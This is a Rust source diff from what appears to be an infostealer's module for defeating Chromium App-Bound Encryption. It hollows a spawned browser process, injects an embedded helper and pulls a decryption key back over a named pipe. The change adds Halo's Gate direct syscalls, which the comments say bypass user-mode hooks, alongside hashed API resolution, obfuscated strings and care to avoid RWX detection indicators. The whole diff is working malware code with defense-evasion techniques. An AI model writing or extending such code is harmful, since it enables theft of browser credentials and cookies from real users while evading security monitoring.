@@ -12,9 +12,13 @@
 //! so the pipe cannot be an inherited anonymous one. Nothing is ever written
 //! to disk by us.
 //!
-//! All Win32/NT calls go through crate::resolve hash resolution; the module
-//! adds no extern blocks and no new imports. No panics: every fallible step
-//! returns None and all handles are closed on the way out.
+//! All Win32 calls go through crate::resolve hash resolution; the remote
+//! (cross-process) hollowing operations additionally prefer direct NT
+//! syscalls (crate::syscall, Halo's Gate SSNs) with a silent per-call
+//! fallback to the hash-resolved Win32/ntdll path when an SSN is
+//! unavailable. The module adds no extern blocks and no new imports.
+//! No panics: every fallible step returns None and all handles are closed
+//! on the way out.
 //!
 //! INTEGRATION (integrator): add `mod abe;` to lib.rs, then in chromium.rs
 //! where v20 blobs are detected, obtain the key with
@@ -25,6 +29,7 @@ use std::ffi::c_void;
 use std::path::{Path, PathBuf};
 
 use crate::resolve::{fnv1a, resolve, wide};
+use crate::syscall::{self, NtAbe};
 
 /// Embedded helper image. Produced by ../build.bat (builds
 /// ../native-abe-helper and copies abe-helper.exe next to Cargo.toml).
@@ -234,6 +239,191 @@ type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> Handle;
 type Process32FirstWFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;
 type Process32NextWFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;
 
+// ---------------------------------------------------------------------------
+// Remote operation dispatch: direct NT syscall first (bypasses user-mode
+// hooks), hash-resolved Win32/ntdll call as the per-call fallback.
+// ---------------------------------------------------------------------------
+
+struct RemoteOps {
+    nt: NtAbe,
+    virtual_alloc_ex: VirtualAllocExFn,
+    virtual_protect_ex: Option<VirtualProtectExFn>,
+    write_process_memory: WriteProcessMemoryFn,
+    read_process_memory: ReadProcessMemoryFn,
+    get_thread_context: GetThreadContextFn,
+    set_thread_context: SetThreadContextFn,
+    resume_thread: ResumeThreadFn,
+    wait_for_single_object: WaitForSingleObjectFn,
+    terminate_process: TerminateProcessFn,
+    nt_query_information_process: NtQueryInformationProcessFn,
+    nt_unmap_view_of_section: NtUnmapViewOfSectionFn,
+}
+
+impl RemoteOps {
+    /// VirtualAllocEx equivalent. Returns the allocated base or null.
+    unsafe fn alloc_ex(&self, h: Handle, want_base: u64, size: usize, protect: u32) -> Handle {
+        if self.nt.allocate_virtual_memory != 0 {
+            let mut base = want_base as usize;
+            let mut region = size;
+            let status = self.nt.allocate_virtual_memory(
+                h as usize,
+                &mut base,
+                0,
+                &mut region,
+                MEM_COMMIT_RESERVE,
+                protect,
+            );
+            return if status >= 0 {
+                base as Handle
+            } else {
+                std::ptr::null_mut()
+            };
+        }
+        (self.virtual_alloc_ex)(
+            h,
+            want_base as usize as Handle,
+            size,
+            MEM_COMMIT_RESERVE,
+            protect,
+        )
+    }
+
+    unsafe fn write(&self, h: Handle, base: usize, data: &[u8]) -> bool {
+        let mut written: usize = 0;
+        if self.nt.write_virtual_memory != 0 {
+            return self.nt.write_virtual_memory(
+                h as usize,
+                base,
+                data.as_ptr() as *const c_void,
+                data.len(),
+                &mut written,
+            ) >= 0 && written == data.len();
+        }
+        (self.write_process_memory)(
+            h,
+            base as Handle,
+            data.as_ptr() as *const c_void,
+            data.len(),
+            &mut written,
+        ) != 0
+            && written == data.len()
+    }
+
+    unsafe fn read_u64(&self, h: Handle, addr: usize) -> Option<u64> {
+        let mut value: u64 = 0;
+        let mut n: usize = 0;
+        if self.nt.read_virtual_memory != 0 {
+            if self.nt.read_virtual_memory(
+                h as usize,
+                addr,
+                &mut value as *mut u64 as *mut c_void,
+                8,
+                &mut n,
+            ) >= 0
+            {
+                return Some(value);
+            }
+            return None;
+        }
+        if (self.read_process_memory)(
+            h,
+            addr as *const c_void,
+            &mut value as *mut u64 as *mut c_void,
+            8,
+            &mut n,
+        ) == 0
+        {
+            return None;
+        }
+        Some(value)
+    }
+
+    /// VirtualProtectEx equivalent; false if neither path is available or
+    /// the call failed (caller decides whether to fall back to RWX).
+    unsafe fn protect_ex(&self, h: Handle, base: usize, size: usize, new: u32) -> bool {
+        if self.nt.protect_virtual_memory != 0 {
+            let mut b = base;
+            let mut s = size;
+            let mut old: u32 = 0;
+            return self
+                .nt
+                .protect_virtual_memory(h as usize, &mut b, &mut s, new, &mut old)
+                >= 0;
+        }
+        if let Some(vp) = self.virtual_protect_ex {
+            let mut old: u32 = 0;
+            return vp(h, base as Handle, size, new, &mut old) != 0;
+        }
+        false
+    }
+
+    unsafe fn get_ctx(&self, h: Handle, ctx: *mut Context) -> bool {
+        if self.nt.get_context_thread != 0 {
+            return self.nt.get_context_thread(h as usize, ctx as *mut c_void) >= 0;
+        }
+        (self.get_thread_context)(h, ctx) != 0
+    }
+
+    unsafe fn set_ctx(&self, h: Handle, ctx: *const Context) -> bool {
+        if self.nt.set_context_thread != 0 {
+            return self.nt.set_context_thread(h as usize, ctx as *const c_void) >= 0;
+        }
+        (self.set_thread_context)(h, ctx) != 0
+    }
+
+    unsafe fn resume(&self, h: Handle) -> bool {
+        if self.nt.resume_thread != 0 {
+            let mut previous: u32 = 0;
+            return self.nt.resume_thread(h as usize, &mut previous) >= 0;
+        }
+        (self.resume_thread)(h) != u32::MAX
+    }
+
+    unsafe fn wait(&self, h: Handle, ms: u32) {
+        if self.nt.wait_for_single_object != 0 {
+            let timeout: i64 = -(ms as i64) * 10_000; // relative, 100ns units
+            self.nt.wait_for_single_object(h as usize, 0, &timeout);
+            return;
+        }
+        (self.wait_for_single_object)(h, ms);
+    }
+
+    unsafe fn terminate(&self, h: Handle) {
+        if self.nt.terminate_process != 0 {
+            self.nt.terminate_process(h as usize, 0);
+            return;
+        }
+        (self.terminate_process)(h, 0);
+    }
+
+    unsafe fn query_basic_info(&self, h: Handle, pbi: *mut ProcessBasicInformation) -> bool {
+        if self.nt.query_information_process != 0 {
+            return self.nt.query_information_process(
+                h as usize,
+                0, // ProcessBasicInformation
+                pbi as *mut c_void,
+                std::mem::size_of::<ProcessBasicInformation>() as u32,
+                std::ptr::null_mut(),
+            ) >= 0;
+        }
+        (self.nt_query_information_process)(
+            h,
+            0,
+            pbi as *mut c_void,
+            std::mem::size_of::<ProcessBasicInformation>() as u32,
+            std::ptr::null_mut(),
+        ) == 0
+    }
+
+    unsafe fn unmap(&self, h: Handle, base: usize) {
+        if self.nt.unmap_view_of_section != 0 {
+            self.nt.unmap_view_of_section(h as usize, base);
+            return;
+        }
+        (self.nt_unmap_view_of_section)(h, base as Handle);
+    }
+}
+
 /// Transmute a resolved address into a typed fn pointer; None if unresolved.
 unsafe fn tf<T>(addr: usize) -> Option<T> {
     if addr == 0 {
@@ -422,25 +612,24 @@ unsafe fn decrypt_inner(browser_root: &Path, browser_name: &str) -> Option<Vec<u
     let ntdll = crate::obf!("ntdll.dll");
     let create_process_w: CreateProcessWFn = tf(resolve(k32, crate::api!("CreateProcessW")))?;
     let read_file: ReadFileFn = tf(resolve(k32, crate::api!("ReadFile")))?;
-    let wait_for_single_object: WaitForSingleObjectFn =
-        tf(resolve(k32, crate::api!("WaitForSingleObject")))?;
-    let terminate_process: TerminateProcessFn = tf(resolve(k32, crate::api!("TerminateProcess")))?;
-    let get_thread_context: GetThreadContextFn = tf(resolve(k32, crate::api!("GetThreadContext")))?;
-    let set_thread_context: SetThreadContextFn = tf(resolve(k32, crate::api!("SetThreadContext")))?;
-    let resume_thread: ResumeThreadFn = tf(resolve(k32, crate::api!("ResumeThread")))?;
-    let virtual_alloc_ex: VirtualAllocExFn = tf(resolve(k32, crate::api!("VirtualAllocEx")))?;
-    // Optional: without it we fall back to leaving the hollow RWX.
-    let virtual_protect_ex: Option<VirtualProtectExFn> =
-        tf(resolve(k32, crate::api!("VirtualProtectEx")));
-    let write_process_memory: WriteProcessMemoryFn =
-        tf(resolve(k32, crate::api!("WriteProcessMemory")))?;
-    let read_process_memory: ReadProcessMemoryFn = tf(resolve(k32, crate::api!("ReadProcessMemory")))?;
-    let nt_query_information_process: NtQueryInformationProcessFn =
-        tf(resolve(&ntdll, crate::api!("NtQueryInformationProcess")))?;
-    let nt_unmap_view_of_section: NtUnmapViewOfSectionFn =
-        tf(resolve(&ntdll, crate::api!("NtUnmapViewOfSection")))?;
     let create_named_pipe_w: CreateNamedPipeWFn = tf(resolve(k32, crate::api!("CreateNamedPipeW")))?;
     let peek_named_pipe: PeekNamedPipeFn = tf(resolve(k32, crate::api!("PeekNamedPipe")))?;
+
+    // Remote ops: direct syscalls where SSNs resolved, Win32/ntdll otherwise.
+    let ops = RemoteOps {
+        nt: syscall::nt_abe(),
+        virtual_alloc_ex: tf(resolve(k32, crate::api!("VirtualAllocEx")))?,
+        virtual_protect_ex: tf(resolve(k32, crate::api!("VirtualProtectEx"))),
+        write_process_memory: tf(resolve(k32, crate::api!("WriteProcessMemory")))?,
+        read_process_memory: tf(resolve(k32, crate::api!("ReadProcessMemory")))?,
+        get_thread_context: tf(resolve(k32, crate::api!("GetThreadContext")))?,
+        set_thread_context: tf(resolve(k32, crate::api!("SetThreadContext")))?,
+        resume_thread: tf(resolve(k32, crate::api!("ResumeThread")))?,
+        wait_for_single_object: tf(resolve(k32, crate::api!("WaitForSingleObject")))?,
+        terminate_process: tf(resolve(k32, crate::api!("TerminateProcess")))?,
+        nt_query_information_process: tf(resolve(&ntdll, crate::api!("NtQueryInformationProcess")))?,
+        nt_unmap_view_of_section: tf(resolve(&ntdll, crate::api!("NtUnmapViewOfSection")))?,
+    };
 
     // Named pipe for the helper's key output. With a spoofed parent the child
     // inherits handles from the spoofed parent, not from us, so the helper
@@ -541,25 +730,11 @@ unsafe fn decrypt_inner(browser_root: &Path, browser_name: &str) -> Option<Vec<u
     let (image, pe) = build_helper_image()?;
 
     // From here on the child always gets terminated before we return.
-    let resumed = hollow_and_resume(
-        pi.h_process,
-        pi.h_thread,
-        &image,
-        &pe,
-        nt_query_information_process,
-        read_process_memory,
-        nt_unmap_view_of_section,
-        virtual_alloc_ex,
-        virtual_protect_ex,
-        write_process_memory,
-        get_thread_context,
-        set_thread_context,
-        resume_thread,
-    );
+    let resumed = hollow_and_resume(pi.h_process, pi.h_thread, &image, &pe, &ops);
     if resumed {
-        wait_for_single_object(pi.h_process, WAIT_TIMEOUT_MS);
+        ops.wait(pi.h_process, WAIT_TIMEOUT_MS);
     }
-    terminate_process(pi.h_process, 0);
+    ops.terminate(pi.h_process);
 
     // Collect whatever the helper wrote (nothing if hollowing failed). Peek
     // first: ReadFile on a server end with no client would block forever.
@@ -686,47 +861,24 @@ fn find_browser_exe(canonical: &str) -> Option<PathBuf> {
 // Hollowing
 // ---------------------------------------------------------------------------
 
-#[allow(clippy::too_many_arguments)]
 unsafe fn hollow_and_resume(
     h_process: Handle,
     h_thread: Handle,
     image: &[u8],
     pe: &PeInfo,
-    nt_query_information_process: NtQueryInformationProcessFn,
-    read_process_memory: ReadProcessMemoryFn,
-    nt_unmap_view_of_section: NtUnmapViewOfSectionFn,
-    virtual_alloc_ex: VirtualAllocExFn,
-    virtual_protect_ex: Option<VirtualProtectExFn>,
-    write_process_memory: WriteProcessMemoryFn,
-    get_thread_context: GetThreadContextFn,
-    set_thread_context: SetThreadContextFn,
-    resume_thread: ResumeThreadFn,
+    ops: &RemoteOps,
 ) -> bool {
     let mut pbi: ProcessBasicInformation = std::mem::zeroed();
-    if nt_query_information_process(
-        h_process,
-        0, // ProcessBasicInformation
-        &mut pbi as *mut _ as *mut c_void,
-        std::mem::size_of::<ProcessBasicInformation>() as u32,
-        std::ptr::null_mut(),
-    ) != 0
-        || pbi.peb_base_address.is_null()
-    {
+    if !ops.query_basic_info(h_process, &mut pbi) || pbi.peb_base_address.is_null() {
         return false;
     }
 
     let peb_base_ptr = pbi.peb_base_address.add(PEB_IMAGE_BASE_OFFSET);
-    let mut remote_base: usize = 0;
-    let mut n: usize = 0;
-    if read_process_memory(
-        h_process,
-        peb_base_ptr as *const c_void,
-        &mut remote_base as *mut usize as *mut c_void,
-        std::mem::size_of::<usize>(),
-        &mut n,
-    ) == 0
-        || remote_base == 0
-    {
+    let Some(remote_base_u64) = ops.read_u64(h_process, peb_base_ptr as usize) else {
+        return false;
+    };
+    let remote_base = remote_base_u64 as usize;
+    if remote_base == 0 {
         return false;
     }
 
@@ -740,13 +892,7 @@ unsafe fn hollow_and_resume(
     // base anyway. Pages are allocated RW and flipped to RX after the write —
     // RWX private regions are a high-fidelity hollowing indicator.
     let mut alloc_base: u64 = 0;
-    let a = virtual_alloc_ex(
-        h_process,
-        pe.preferred_base as usize as Handle,
-        image.len(),
-        MEM_COMMIT_RESERVE,
-        PAGE_READWRITE,
-    );
+    let a = ops.alloc_ex(h_process, pe.preferred_base, image.len(), PAGE_READWRITE);
     if !a.is_null() {
         alloc_base = a as usize as u64;
     }
@@ -755,16 +901,10 @@ unsafe fn hollow_and_resume(
     // (relocating the helper if it has a .reloc section), and fix up the PEB.
     let mut unmapped = false;
     if alloc_base == 0 {
-        nt_unmap_view_of_section(h_process, remote_base as Handle);
+        ops.unmap(h_process, remote_base);
         unmapped = true;
         for base in [remote_base as u64, pe.preferred_base, 0] {
-            let a = virtual_alloc_ex(
-                h_process,
-                base as usize as Handle,
-                image.len(),
-                MEM_COMMIT_RESERVE,
-                PAGE_READWRITE,
-            );
+            let a = ops.alloc_ex(h_process, base, image.len(), PAGE_READWRITE);
             if a.is_null() {
                 continue;
             }
@@ -803,65 +943,42 @@ unsafe fn hollow_and_resume(
         image
     };
 
-    let mut written: usize = 0;
-    if write_process_memory(
-        h_process,
-        alloc_base as usize as Handle,
-        final_image.as_ptr() as *const c_void,
-        final_image.len(),
-        &mut written,
-    ) == 0
-        || written != final_image.len()
-    {
+    if !ops.write(h_process, alloc_base as usize, final_image) {
         return false;
     }
 
     // Keep the PEB consistent only if we actually replaced the image.
     if unmapped && alloc_base as usize != remote_base {
-        if write_process_memory(
+        if !ops.write(
             h_process,
-            peb_base_ptr as Handle,
-            &alloc_base as *const u64 as *const c_void,
-            std::mem::size_of::<u64>(),
-            &mut written,
-        ) == 0
-        {
+            peb_base_ptr as usize,
+            &alloc_base.to_le_bytes(),
+        ) {
             return false;
         }
     }
 
-    // Flip the written image to RX before resuming. If VirtualProtectEx is
-    // unavailable or fails, fall back to RWX rather than fail the hollow.
-    if let Some(vp) = virtual_protect_ex {
-        let mut old_protect: u32 = 0;
-        if vp(
+    // Flip the written image to RX before resuming. If the protect fails
+    // (either path), fall back to RWX rather than fail the hollow.
+    if !ops.protect_ex(h_process, alloc_base as usize, final_image.len(), PAGE_EXECUTE_READ) {
+        ops.protect_ex(
             h_process,
-            alloc_base as usize as Handle,
+            alloc_base as usize,
             final_image.len(),
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        ) == 0
-        {
-            vp(
-                h_process,
-                alloc_base as usize as Handle,
-                final_image.len(),
-                PAGE_EXECUTE_READWRITE,
-                &mut old_protect,
-            );
-        }
+            PAGE_EXECUTE_READWRITE,
+        );
     }
 
     let mut ctx: Context = std::mem::zeroed();
     ctx.context_flags = CONTEXT_FULL_X64;
-    if get_thread_context(h_thread, &mut ctx) == 0 {
+    if !ops.get_ctx(h_thread, &mut ctx) {
         return false;
     }
     ctx.rcx = alloc_base + pe.entry_rva as u64;
-    if set_thread_context(h_thread, &ctx) == 0 {
+    if !ops.set_ctx(h_thread, &ctx) {
         return false;
     }
-    resume_thread(h_thread) != u32::MAX
+    ops.resume(h_thread)
 }
 
 // ---------------------------------------------------------------------------
